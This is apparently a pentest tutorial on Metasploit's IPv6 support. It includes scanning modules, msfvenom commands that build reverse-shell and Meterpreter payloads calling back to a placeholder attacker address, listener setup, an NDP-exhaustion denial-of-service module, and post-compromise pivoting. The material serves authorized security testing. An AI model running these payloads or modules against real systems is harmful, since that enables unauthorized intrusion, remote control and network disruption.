# How to Use Metasploit IPv6 Modules for Testing

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: Metasploit, IPv6, Security Testing, Penetration Testing, Exploit Framework

Description: A guide to using Metasploit Framework's IPv6 capabilities for authorized penetration testing, including auxiliary modules for scanning, enumeration, and exploit delivery over IPv6.

Metasploit Framework supports IPv6 throughout its module ecosystem. Most exploits, auxiliary modules, and payloads work transparently with IPv6 addresses. This guide covers the IPv6-specific modules and configuration required for IPv6 penetration testing in authorized environments.

**Warning**: Use only in authorized environments. Unauthorized use is illegal.

## Metasploit IPv6 Prerequisites

```bash
# Start Metasploit console

msfconsole

# Verify IPv6 support
msf6 > version
# Should show IPv6 support is enabled
```

## Setting IPv6 Targets and Listeners

IPv6 addresses require brackets in Metasploit due to the colon notation:

```bash
# Set IPv6 target
msf6 exploit(multi/handler) > set RHOSTS 2001:db8::target

# Set IPv6 listener
msf6 exploit(multi/handler) > set LHOST 2001:db8::attacker

# Verify IPv6 is being used
msf6 > show options
```

## IPv6 Scanning Modules

### TCP Port Scan over IPv6

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 2001:db8::target
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22,80,443,8080
msf6 auxiliary(scanner/portscan/tcp) > run
```

### SYN Scan over IPv6

```bash
msf6 > use auxiliary/scanner/portscan/syn
msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 2001:db8::target
msf6 auxiliary(scanner/portscan/syn) > set THREADS 10
msf6 auxiliary(scanner/portscan/syn) > run
```

## IPv6 Service Scanning

### SSH Enumeration over IPv6

```bash
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 2001:db8::target
msf6 auxiliary(scanner/ssh/ssh_version) > run
```

### HTTP Version Detection over IPv6

```bash
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 2001:db8::target
msf6 auxiliary(scanner/http/http_version) > set RPORT 80
msf6 auxiliary(scanner/http/http_version) > run
```

### SMB Scanning over IPv6 (Windows)

```bash
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 2001:db8::windows-target
msf6 auxiliary(scanner/smb/smb_version) > run
```

## Delivering Payloads over IPv6

### Reverse Shell over IPv6

```bash
# Generate IPv6 reverse shell payload
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=2001:db8::attacker \
  LPORT=4444 \
  -f elf -o reverse_shell_ipv6

# Set up listener
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 2001:db8::attacker
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

### Meterpreter over IPv6

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=2001:db8::attacker \
  LPORT=5555 \
  -f elf -o meterpreter_ipv6

# Listener
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 2001:db8::attacker
msf6 exploit(multi/handler) > run
```

## IPv6-Specific Modules

```bash
# NDP flooding
msf6 > use auxiliary/dos/ip/ndp_exhaustion

# IPv6 neighbor discovery enumeration
msf6 > use auxiliary/scanner/discovery/ipv6_neighbor

# IPv6 multicast ping sweep
msf6 > use auxiliary/scanner/discovery/ipv6_multicast_ping
msf6 auxiliary(scanner/discovery/ipv6_multicast_ping) > set INTERFACE eth0
msf6 auxiliary(scanner/discovery/ipv6_multicast_ping) > run
```

## Pivoting Through IPv6 Networks

```bash
# After compromising a dual-stack host, pivot to IPv6-only network
msf6 > use post/multi/manage/shell_to_meterpreter
# Then route IPv6 traffic through the session
msf6 > route add 2001:db8:internal::/48 <session_id>
```

## Important Notes

- Always set `RHOSTS` with the full IPv6 address
- IPv6 addresses containing colons may need quoting in some contexts
- Verify your listener interface supports IPv6: `ifconfig eth0 | grep inet6`
- Many exploits that work on IPv4 services also work over IPv6 - IPv6 doesn't change application-layer vulnerabilities

Metasploit's transparent IPv6 support means most standard testing techniques work directly with IPv6 targets, making it straightforward to include IPv6 addresses in authorized penetration testing engagements.
